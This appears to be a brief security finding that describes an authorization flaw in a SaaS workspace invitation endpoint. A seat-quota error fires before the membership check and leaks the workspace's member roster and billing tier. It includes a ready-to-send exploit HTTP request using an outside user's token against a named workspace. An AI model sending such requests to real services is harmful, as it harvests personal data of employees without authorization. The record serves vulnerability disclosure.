diagnosis: The workspace invitation endpoint checks seat quota and triggers SeatQuotaExceededError before verifying if current_user belongs to workspace_id. The custom exception handler outputs the full active roster (emails, full names, roles) and billing tier of the workspace in the 400 response, enabling attackers to harvest the entire employee directory of victim workspaces.
exploit_request:
POST /workspaces/ws_secops_9921/invitations HTTP/1.1
Host: api.saasplatform.com
Authorization: Bearer <external_user_token>
Content-Type: application/json

{"email": "probe@attacker.io"}
